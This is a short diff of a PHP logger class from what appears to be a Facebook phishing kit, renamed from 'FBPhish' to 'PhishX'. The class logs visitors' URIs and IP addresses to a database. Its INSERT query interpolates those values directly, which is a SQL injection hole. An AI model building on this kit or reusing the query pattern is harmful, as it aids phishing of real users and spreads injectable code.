@@ -1,7 +1,7 @@
 <?php
 /*
-FBPhish
-Copyright (C) 2016  Jamie4224
+PhishX
+Copyright (c) 2016 Jamie4224
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
@@ -46,7 +46,7 @@ class logger extends sql{
 		global $blacklisted;
 		global $bl;
 
-			$this->insertUriData = "INSERT INTO `fbphish_log_uri` (`id`, `type`, `record_date`, `uri`, `logged_from`, `error`, `user_ip`, `meta_user_ip`, `extra`) VALUES (NULL, '$type', CURRENT_TIMESTAMP, '$uri', '$logfrom', '$error', '$userIp', '$metaUserIp', '$extra')";
+			$this->insertUriData = "INSERT INTO `phishx_log_uri` (`id`, `type`, `record_date`, `uri`, `logged_from`, `error`, `user_ip`, `meta_user_ip`, `extra`) VALUES (NULL, '$type', CURRENT_TIMESTAMP, '$uri', '$logfrom', '$error', '$userIp', '$metaUserIp', '$extra')";
 
 			parent::db_connect();
 			parent::query($this->insertUriData);
